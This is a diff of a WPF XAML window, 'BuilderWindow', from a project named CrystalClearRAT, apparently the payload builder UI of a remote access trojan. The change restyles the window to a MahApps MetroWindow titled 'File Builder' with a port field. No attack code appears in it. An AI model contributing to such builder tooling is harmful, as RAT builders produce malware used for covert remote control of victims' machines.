@@ -1,11 +1,9 @@
-﻿<Window x:Class="CrystalClearRAT.Windows.BuilderWindow"
+﻿<mah:MetroWindow x:Class="CrystalClearRAT.Windows.BuilderWindow"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
-        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
-        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
-        xmlns:local="clr-namespace:CrystalClearRAT.Windows"
-        mc:Ignorable="d"
-        Title="BuilderWindow" Height="300" Width="200">
+                 xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+                 xmlns:mah="http://metro.mahapps.com/winfx/xaml/controls"
+        xmlns:local="clr-namespace:CrystalClearRAT.Windows" TitleCharacterCasing="Normal"
+        Title="File Builder" Height="300" Width="200"  WindowTitleBrush="#9b0000" Background="#FFE1E2E1">
     <Grid>
         <Grid.RowDefinitions>
 
@@ -35,4 +33,4 @@
         <TextBlock Grid.Column="1" HorizontalAlignment="Center" Margin="0" Grid.Row="3" TextWrapping="Wrap" Text="Port:" VerticalAlignment="Center"/>
         <TextBox x:Name="portTextBox" Grid.Column="2" Margin="0" Grid.Row="3" TextWrapping="Wrap" VerticalContentAlignment="Center"/>
     </Grid>
-</Window>
+ </mah:MetroWindow>
